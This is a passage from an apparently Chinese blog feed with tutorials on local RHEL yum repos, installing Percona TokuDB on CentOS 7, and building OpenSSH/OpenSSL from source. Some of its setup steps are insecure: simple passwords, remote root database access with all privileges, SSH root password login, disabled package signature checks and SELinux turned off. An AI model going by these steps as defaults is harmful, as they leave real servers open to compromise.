<h2 id="4-注意事项"><a href="#4-注意事项" class="headerlink" title="4 注意事项"></a>4 注意事项</h2><p><strong>①. 注意</strong> <strong>在windows下解压镜像发现repodata中的后缀总是缺失</strong>。在Linux下挂载倒是没问题</p>
<p><strong>②. rh6.4以下baseurl指定的是镜像路径下的Server文件夹</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[RHEL-LOCAL]</span></pre></td></tr><tr><td class="code"><pre><span class="line">name&#x3D;rhel54</span></pre></td></tr><tr><td class="code"><pre><span class="line">baseurl&#x3D;file:&#x2F;&#x2F;&#x2F;media&#x2F;rhel5&#x2F;Server</span></pre></td></tr><tr><td class="code"><pre><span class="line">gpgcheck&#x3D;0</span></pre></td></tr><tr><td class="code"><pre><span class="line">enabled&#x3D;1</span></pre></td></tr></table></figure>
<p><strong>③. rh6.4以上baseurl指定的是整个镜像文件根目录</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[RHEL-LOCAL]</span></pre></td></tr><tr><td class="code"><pre><span class="line">name&#x3D;rhel64</span></pre></td></tr><tr><td class="code"><pre><span class="line">baseurl&#x3D;file:&#x2F;&#x2F;&#x2F;media&#x2F;rhel5&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">gpgcheck&#x3D;0</span></pre></td></tr><tr><td class="code"><pre><span class="line">enabled&#x3D;1</span></pre></td></tr></table></figure>
<p><strong>④. 测试 RedHat 5.4、RedHat 6.5、 CentOS7、CentOS7-1611都可以</strong></p>
<p><strong>⑤. 如果使用其他源更新以后再用光盘镜像挂载会出现一些问题</strong></p>
<p>我使用的一台测试机器CentOS7-1611-mini使用官方源update以后使用光盘源安装Gnome 桌面报如下错误</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Error: Package: 1:NetworkManager-bluetooth-1.4.0-12.el7.x86_64 (centos-local)</span></pre></td></tr><tr><td class="code"><pre><span class="line">           Requires: NetworkManager(x86-64) = 1:1.4.0-12.el7</span></pre></td></tr><tr><td class="code"><pre><span class="line">           Installed: 1:NetworkManager-1.4.0-14.el7_3.x86_64 (@updates)</span></pre></td></tr><tr><td class="code"><pre><span class="line">               NetworkManager(x86-64) = 1:1.4.0-14.el7_3</span></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>CentOS7 install tokudb</title>
    <url>/2017/07/CentOS7-install-tokudb/</url>
    <content><![CDATA[<h1 id="CentOS7下-安装MySQL存储引擎tokudb"><a href="#CentOS7下-安装MySQL存储引擎tokudb" class="headerlink" title="CentOS7下 安装MySQL存储引擎tokudb"></a>CentOS7下 安装MySQL存储引擎tokudb</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Percona Server for MySQL 5.6</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载Percona-Server-5.6.36-82.0-r58e846a-el7-x86_64-bundle.tar地址为</p>
<p><a href="https://www.percona.com/downloads/Percona-Server-5.6/Percona-Server-5.6.36-82.0/binary/redhat/7/x86_64/Percona-Server-5.6.36-82.0-r58e846a-el7-x86_64-bundle.tar" target="_blank" rel="noopener">https://www.percona.com/downloads/Percona-Server-5.6/Percona-Server-5.6.36-82.0/binary/redhat/7/x86_64/Percona-Server-5.6.36-82.0-r58e846a-el7-x86_64-bundle.tar</a></p>
<p>解压</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xvf Percona-Server-5.6.36-82.0-r58e846a-el7-x86_64-bundle.tar</span></pre></td></tr></table></figure>
<p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum remove mariadb* -y</span></pre></td></tr><tr><td class="code"><pre><span class="line">yum install libaio.so.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">yum install libaio</span></pre></td></tr><tr><td class="code"><pre><span class="line">yum install jemalloc</span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh Percona-Server-devel-56-5.6.36-rel82.0.el7.x86_64.rpm</span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh Percona-Server-shared-56-5.6.36-rel82.0.el7.x86_64.rpm</span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh Percona-Server-client-56-5.6.36-rel82.0.el7.x86_64.rpm</span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh Percona-Server-server-56-5.6.36-rel82.0.el7.x86_64.rpm</span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh Percona-Server-tokudb-56-5.6.36-rel82.0.el7.x86_64.rpm</span></pre></td></tr></table></figure>
<p>修改密码.mysql5.6默认生成一个动态密码。percona默认是不生成密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -u root </span></pre></td></tr><tr><td class="code"><pre><span class="line">update mysql.user set password=password('123qaz456');</span></pre></td></tr><tr><td class="code"><pre><span class="line">使用tokudb</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ps_tokudb_admin --<span class="built_in">enable</span> -u &lt;mysql_admin_user&gt; -p[mysql_admin_pass] [-S &lt;socket&gt;] [-h &lt;host&gt; -P &lt;port&gt;]</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"> ps_tokudb_admin --enable -u root -p123qaz456</span></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost package]# ps_tokudb_admin --enable -u root -p123qaz456</span></pre></td></tr><tr><td class="code"><pre><span class="line">Checking SELinux status...</span></pre></td></tr><tr><td class="code"><pre><span class="line">INFO: SELinux is disabled.</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">Checking if Percona Server is running with jemalloc enabled...</span></pre></td></tr><tr><td class="code"><pre><span class="line">INFO: Percona Server is running with jemalloc enabled.</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">Checking transparent huge pages status on the system...</span></pre></td></tr><tr><td class="code"><pre><span class="line">INFO: Transparent huge pages are enabled (should be disabled).</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">Checking if thp-setting=never option is already set in config file...</span></pre></td></tr><tr><td class="code"><pre><span class="line">INFO: Option thp-setting=never is not set in the config file.</span></pre></td></tr><tr><td class="code"><pre><span class="line">      (needed only if THP is not disabled permanently on the system)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">Checking TokuDB engine plugin status...</span></pre></td></tr><tr><td class="code"><pre><span class="line">INFO: TokuDB engine plugin is not installed.</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">Disabling transparent huge pages for the current session...</span></pre></td></tr><tr><td class="code"><pre><span class="line">INFO: Successfully disabled transparent huge pages for this session.</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">Adding thp-setting=never option into /etc/my.cnf</span></pre></td></tr><tr><td class="code"><pre><span class="line">INFO: Successfully added thp-setting=never option into /etc/my.cnf</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">Installing TokuDB engine...</span></pre></td></tr><tr><td class="code"><pre><span class="line">INFO: Successfully installed TokuDB engine plugin.</span></pre></td></tr></table></figure>
<p>查看MySQL引擎信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; show engines \G;</span></pre></td></tr><tr><td class="code"><pre><span class="line">*************************** 1. row ***************************</span></pre></td></tr><tr><td class="code"><pre><span class="line">      Engine: MyISAM</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Support: YES</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Comment: MyISAM storage engine</span></pre></td></tr><tr><td class="code"><pre><span class="line">Transactions: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">          XA: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">  Savepoints: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">*************************** 2. row ***************************</span></pre></td></tr><tr><td class="code"><pre><span class="line">      Engine: CSV</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Support: YES</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Comment: CSV storage engine</span></pre></td></tr><tr><td class="code"><pre><span class="line">Transactions: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">          XA: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">  Savepoints: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">*************************** 3. row ***************************</span></pre></td></tr><tr><td class="code"><pre><span class="line">      Engine: MRG_MYISAM</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Support: YES</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Comment: Collection of identical MyISAM tables</span></pre></td></tr><tr><td class="code"><pre><span class="line">Transactions: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">          XA: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">  Savepoints: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">*************************** 4. row ***************************</span></pre></td></tr><tr><td class="code"><pre><span class="line">      Engine: BLACKHOLE</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Support: YES</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Comment: &#x2F;dev&#x2F;null storage engine (anything you write to it disappears)</span></pre></td></tr><tr><td class="code"><pre><span class="line">Transactions: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">          XA: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">  Savepoints: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">*************************** 5. row ***************************</span></pre></td></tr><tr><td class="code"><pre><span class="line">      Engine: PERFORMANCE_SCHEMA</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Support: YES</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Comment: Performance Schema</span></pre></td></tr><tr><td class="code"><pre><span class="line">Transactions: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">          XA: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">  Savepoints: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">*************************** 6. row ***************************</span></pre></td></tr><tr><td class="code"><pre><span class="line">      Engine: TokuDB</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Support: YES</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Comment: Percona TokuDB Storage Engine with Fractal Tree(tm) Technology</span></pre></td></tr><tr><td class="code"><pre><span class="line">Transactions: YES</span></pre></td></tr><tr><td class="code"><pre><span class="line">          XA: YES</span></pre></td></tr><tr><td class="code"><pre><span class="line">  Savepoints: YES</span></pre></td></tr><tr><td class="code"><pre><span class="line">*************************** 7. row ***************************</span></pre></td></tr><tr><td class="code"><pre><span class="line">      Engine: MEMORY</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Support: YES</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Comment: Hash based, stored in memory, useful for temporary tables</span></pre></td></tr><tr><td class="code"><pre><span class="line">Transactions: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">          XA: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">  Savepoints: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">*************************** 8. row ***************************</span></pre></td></tr><tr><td class="code"><pre><span class="line">      Engine: ARCHIVE</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Support: YES</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Comment: Archive storage engine</span></pre></td></tr><tr><td class="code"><pre><span class="line">Transactions: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">          XA: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">  Savepoints: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">*************************** 9. row ***************************</span></pre></td></tr><tr><td class="code"><pre><span class="line">      Engine: InnoDB</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Support: DEFAULT</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Comment: Percona-XtraDB, Supports transactions, row-level locking, and foreign keys</span></pre></td></tr><tr><td class="code"><pre><span class="line">Transactions: YES</span></pre></td></tr><tr><td class="code"><pre><span class="line">          XA: YES</span></pre></td></tr><tr><td class="code"><pre><span class="line">  Savepoints: YES</span></pre></td></tr><tr><td class="code"><pre><span class="line">*************************** 10. row ***************************</span></pre></td></tr><tr><td class="code"><pre><span class="line">      Engine: FEDERATED</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Support: NO</span></pre></td></tr><tr><td class="code"><pre><span class="line">     Comment: Federated MySQL storage engine</span></pre></td></tr><tr><td class="code"><pre><span class="line">Transactions: NULL</span></pre></td></tr><tr><td class="code"><pre><span class="line">          XA: NULL</span></pre></td></tr><tr><td class="code"><pre><span class="line">  Savepoints: NULL</span></pre></td></tr><tr><td class="code"><pre><span class="line">10 rows in set (0.00 sec)</span></pre></td></tr></table></figure>
<p>可以看到tokudb已经安装成功</p>
<p>设置远程用户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grant all privileges on *.* to 'root'@'%' identified by '123#456' with grant option;</span></pre></td></tr></table></figure>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">symbolic-links&#x3D;0</span></pre></td></tr><tr><td class="code"><pre><span class="line">log-bin&#x3D;mysql-bin</span></pre></td></tr><tr><td class="code"><pre><span class="line">server-id&#x3D;1</span></pre></td></tr><tr><td class="code"><pre><span class="line">expire_logs_days&#x3D;7</span></pre></td></tr><tr><td class="code"><pre><span class="line">lower_case_table_names&#x3D;1</span></pre></td></tr><tr><td class="code"><pre><span class="line">character-set-server &#x3D;utf8</span></pre></td></tr><tr><td class="code"><pre><span class="line">collation-server&#x3D;utf8_general_ci</span></pre></td></tr><tr><td class="code"><pre><span class="line">slow-query-log&#x3D;1</span></pre></td></tr><tr><td class="code"><pre><span class="line">slow-query-log-file&#x3D;&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;slow.log</span></pre></td></tr><tr><td class="code"><pre><span class="line">sync_binlog&#x3D;500</span></pre></td></tr><tr><td class="code"><pre><span class="line">innodb_buffer_pool_size&#x3D;512M</span></pre></td></tr><tr><td class="code"><pre><span class="line">innodb_buffer_pool_instances&#x3D;1</span></pre></td></tr><tr><td class="code"><pre><span class="line">innodb_flush_method&#x3D;O_DIRECT</span></pre></td></tr><tr><td class="code"><pre><span class="line">innodb_log_file_size&#x3D;128M</span></pre></td></tr><tr><td class="code"><pre><span class="line">innodb_log_buffer_size&#x3D;8M</span></pre></td></tr><tr><td class="code"><pre><span class="line">innodb_flush_log_at_trx_commit &#x3D; 2</span></pre></td></tr></table></figure>
<p><strong>参考</strong><br><a href="https://www.percona.com/doc/percona-server/5.6/installation/yum_repo.html" target="_blank" rel="noopener">https://www.percona.com/doc/percona-server/5.6/installation/yum_repo.html</a></p>
<p><a href="https://www.percona.com/downloads/Percona-Server-5.6/LATEST/" target="_blank" rel="noopener">https://www.percona.com/downloads/Percona-Server-5.6/LATEST/</a></p>
]]></content>
  </entry>
  <entry>
    <title>openssl_update</title>
    <url>/2017/07/openssl-update/</url>
    <content><![CDATA[<h1 id="ReadHat5-4x86升级openssh"><a href="#ReadHat5-4x86升级openssh" class="headerlink" title="ReadHat5.4x86升级openssh"></a>ReadHat5.4x86升级openssh</h1><h2 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h2><p>解压ReadHat5.4镜像需要版本对应我这里是<code>rhel-server-5.4-i386-dvd.iso</code>解压镜像找到目录<code>rhel-server-5.4-i386-dvd\Server</code> <strong>注意大小版本不一致会导致出现问题</strong>。</p>
<p>找到如下文件复制到主机环境(一点点试出来的不要怀疑)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kernel-headers-2.6.18-164.el5.i386.rpm #内核开发包</span></pre></td></tr><tr><td class="code"><pre><span class="line">glibc-headers-2.5-42.i386.rpm #gcc 编译环境必用</span></pre></td></tr><tr><td class="code"><pre><span class="line">glibc-devel-2.5-42.i386.rpm #gcc 编译环境必用</span></pre></td></tr><tr><td class="code"><pre><span class="line">gcc-4.1.2-46.el5.i386.rpm #gcc 编译环境必用</span></pre></td></tr><tr><td class="code"><pre><span class="line">e2fsprogs-devel-1.39-23.el5.i386.rpm  #GSSAPI</span></pre></td></tr><tr><td class="code"><pre><span class="line">krb5-devel-1.6.1-36.el5.i386.rpm #GSSAPI 主要是为了安装krb5</span></pre></td></tr><tr><td class="code"><pre><span class="line">libselinux-devel-1.33.4-5.5.el5.i386.rpm #GSSAPI</span></pre></td></tr><tr><td class="code"><pre><span class="line">libsepol-devel-1.15.2-2.el5.i386.rpm #GSSAPI</span></pre></td></tr><tr><td class="code"><pre><span class="line">pam-devel-0.99.6.2-6.el5.i386.rpm #PAM认证模块</span></pre></td></tr><tr><td class="code"><pre><span class="line">keyutils-libs-devel-1.2-1.el5.i386.rpm #GSSAPI</span></pre></td></tr><tr><td class="code"><pre><span class="line">libgomp-4.4.0-6.el5.i386.rpm #gcc 编译环境必用</span></pre></td></tr></table></figure>
<p>下载如下文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zlib-1.2.11.tar.gz</span></pre></td></tr><tr><td class="code"><pre><span class="line">openssh-7.5p1.tar.gz</span></pre></td></tr><tr><td class="code"><pre><span class="line">openssl-1.0.2h.tar.gz</span></pre></td></tr></table></figure>
<h1 id="2-安装"><a href="#2-安装" class="headerlink" title="2. 安装"></a>2. 安装</h1><h3 id="编译环境安装注意顺序"><a href="#编译环境安装注意顺序" class="headerlink" title="编译环境安装注意顺序"></a>编译环境安装<strong>注意顺序</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">安装编译环境</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh kernel-headers-2.6.18-164.el5.i386.rpm</span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh glibc-headers-2.5-42.i386.rpm</span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh glibc-devel-2.5-42.i386.rpm</span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh libgomp-4.4.0-6.el5.i386.rpm</span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh gcc-4.1.2-46.el5.i386.rpm</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">PAM模块支持</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh pam-devel-0.99.6.2-6.el5.i386.rpm</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">安装GSSAPI支持 openssh 使用的</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh e2fsprogs-devel-1.39-23.el5.i386.rpm</span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh libsepol-devel-1.15.2-2.el5.i386.rpm</span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh libselinux-devel-1.33.4-5.5.el5.i386.rpm</span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh keyutils-libs-devel-1.2-1.el5.i386.rpm</span></pre></td></tr><tr><td class="code"><pre><span class="line">rpm -ivh krb5-devel-1.6.1-36.el5.i386.rpm</span></pre></td></tr></table></figure>
<h3 id="zlib安装"><a href="#zlib安装" class="headerlink" title="zlib安装"></a>zlib安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">解压</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">tar -zxvf zlib-1.2.11.tar.gz</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">进入目录</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">cd zlib-1.2.11</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">编译安装</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">./configure</span></pre></td></tr><tr><td class="code"><pre><span class="line">make &amp;&amp; make install</span></pre></td></tr></table></figure>
<h3 id="OpenSSL安装"><a href="#OpenSSL安装" class="headerlink" title="OpenSSL安装"></a>OpenSSL安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">解压</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">tar -zxvf openssl-1.0.2h.tar.gz</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">进入目录</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">cd openssl-1.0.2h</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">编译安装shell</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">./config --prefix=/usr/local/openssl-1.0.2h shared zlib-dynamic enable-camellia</span></pre></td></tr><tr><td class="code"><pre><span class="line">make depend</span></pre></td></tr><tr><td class="code"><pre><span class="line">make &amp;&amp; make install</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">移除不必要文件</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">mv /usr/bin/openssl /usr/bin/openssl.bak</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">建立软连接（方便后续升级，只需要更改链接位置）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">ln -s /usr/local/openssl-1.0.2h/ /usr/local/ssl</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">后续操作</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">ln -s /usr/local/ssl/bin/openssl /usr/bin/openssl</span></pre></td></tr><tr><td class="code"><pre><span class="line">ln -s /usr/local/ssl/include/openssl /usr/include/openssl</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo "/usr/local/ssl/lib" &gt;&gt; /etc/ld.so.conf</span></pre></td></tr><tr><td class="code"><pre><span class="line">ldconfig -v</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看openssl版本</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">openssl version -a</span></pre></td></tr></table></figure>
<h3 id="安装OpenSSH"><a href="#安装OpenSSH" class="headerlink" title="安装OpenSSH"></a>安装OpenSSH</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">解压</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">tar -zxvf openssh-7.5p1.tar.gz</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">进入目录</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">cd openssh-7.5p1</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">编译安装</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-zlib --with-md5-passwords --with-ssl-dir=/usr/local/ssl --with-kerberos5=/usr/include/krb5/</span></pre></td></tr><tr><td class="code"><pre><span class="line">make &amp;&amp; make install</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">修改配置文件。不修改root账户无法远程</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">echo " PermitRootLogin yes " &gt;&gt; /etc/ssh/sshd_config &amp;&amp; echo " PasswordAuthentication yes " &gt;&gt; /etc/ssh/sshd_config</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">重启</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">service sshd restart</span></pre></td></tr></table></figure>
<h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#如果是全新安装(如果以前有OpenSSH可以不用)</span></pre></td></tr><tr><td class="code"><pre><span class="line">cp contrib&#x2F;redhat&#x2F;sshd.init &#x2F;etc&#x2F;init.d&#x2F;sshd</span></pre></td></tr><tr><td class="code"><pre><span class="line">chkconfig sshd on</span></pre></td></tr><tr><td class="code"><pre><span class="line">chkconfig –list |grep ssh</span></pre></td></tr><tr><td class="code"><pre><span class="line">chkconfig --add sshd</span></pre></td></tr><tr><td class="code"><pre><span class="line">chkconfig  --list  | grep ssh</span></pre></td></tr></table></figure>
<h2 id="3-错误解决方案"><a href="#3-错误解决方案" class="headerlink" title="3. 错误解决方案"></a>3. 错误解决方案</h2><h3 id="Permission-denied"><a href="#Permission-denied" class="headerlink" title="Permission denied"></a>Permission denied</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Stopping sshd:                                             [  OK  ]</span></pre></td></tr><tr><td class="code"><pre><span class="line">Starting sshd: &#x2F;usr&#x2F;sbin&#x2F;sshd: error while loading shared libraries: libcrypto.so.1.0.0: failed to map segment from shared object: Permission denied</span></pre></td></tr></table></figure>
<p>解决方案关闭selinux</p>
<p>临时关闭为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setenforce 0</span></pre></td></tr></table></figure>
<h3 id="openssl-header-and-openssl-版本不匹配"><a href="#openssl-header-and-openssl-版本不匹配" class="headerlink" title="openssl header and openssl   版本不匹配"></a>openssl header and openssl   版本不匹配</h3><p>这个问题很烦人。出现在ubuntu系统当中显示的openssl header version和 openssl library不匹配。header 头是OpenSSL 1.0.2h 。动态链接库是1.0.1f经过读配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DEFAULT_LIBPATH=/usr/lib:/usr/local/lib</span></pre></td></tr><tr><td class="code"><pre><span class="line">LIBPATH=$&#123;LIBPATH:=$DEFAULT_LIBPATH&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">LD_LIBRARY_PATH=$&#123;LD_LIBRARY_PATH:=$DEFAULT_LIBPATH&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">LIBRARY_PATH=$&#123;LIBRARY_PATH:=$DEFAULT_LIBPATH&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">export LIBPATH LD_LIBRARY_PATH LIBRARY_PATH</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">...</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">echo Searching for OpenSSL shared library files.</span></pre></td></tr><tr><td class="code"><pre><span class="line">if [ -x "`which locate`" ]</span></pre></td></tr><tr><td class="code"><pre><span class="line">then</span></pre></td></tr><tr><td class="code"><pre><span class="line">    libraries=`locate libcrypto.s`</span></pre></td></tr><tr><td class="code"><pre><span class="line">else</span></pre></td></tr><tr><td class="code"><pre><span class="line">    libraries=`find / -name 'libcrypto.s*' -print 2&gt;/dev/null`</span></pre></td></tr><tr><td class="code"><pre><span class="line">fi</span></pre></td></tr><tr><td class="code"><pre><span class="line">for lib in $libraries</span></pre></td></tr><tr><td class="code"><pre><span class="line">do</span></pre></td></tr><tr><td class="code"><pre><span class="line">    (echo "Trying libcrypto $lib" &gt;&gt;findssl.log</span></pre></td></tr><tr><td class="code"><pre><span class="line">    dir=`dirname $lib`</span></pre></td></tr><tr><td class="code"><pre><span class="line">    LIBPATH="$dir:$LIBPATH"</span></pre></td></tr><tr><td class="code"><pre><span class="line">    LD_LIBRARY_PATH="$dir:$LIBPATH"</span></pre></td></tr><tr><td class="code"><pre><span class="line">    LIBRARY_PATH="$dir:$LIBPATH"</span></pre></td></tr><tr><td class="code"><pre><span class="line">    export LIBPATH LD_LIBRARY_PATH LIBRARY_PATH</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $&#123;CC&#125; -o conftest conftest.c $lib 2&gt;&gt;findssl.log</span></pre></td></tr><tr><td class="code"><pre><span class="line">    if [ -x ./conftest ]</span></pre></td></tr><tr><td class="code"><pre><span class="line">    then</span></pre></td></tr><tr><td class="code"><pre><span class="line">        ver=`./conftest 2&gt;/dev/null`</span></pre></td></tr><tr><td class="code"><pre><span class="line">        rm -f ./conftest</span></pre></td></tr><tr><td class="code"><pre><span class="line">        echo "$ver $lib"</span></pre></td></tr><tr><td class="code"><pre><span class="line">    fi)</span></pre></td></tr><tr><td class="code"><pre><span class="line">done</span></pre></td></tr></table></figure>
<p>具体找动态库的过程如下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo Searching for OpenSSL shared library files.</span></pre></td></tr><tr><td class="code"><pre><span class="line">if [ -x "`which locate`" ]</span></pre></td></tr><tr><td class="code"><pre><span class="line">then</span></pre></td></tr><tr><td class="code"><pre><span class="line">    libraries=`locate libcrypto.s`</span></pre></td></tr><tr><td class="code"><pre><span class="line">else</span></pre></td></tr><tr><td class="code"><pre><span class="line">    libraries=`find / -name 'libcrypto.s*' -print 2&gt;/dev/null`</span></pre></td></tr><tr><td class="code"><pre><span class="line">fi</span></pre></td></tr></table></figure>
<p>先通过locate 找，如果找不到会用find找。<br>locate 找的过程如下。docker里面竟然也有</p>
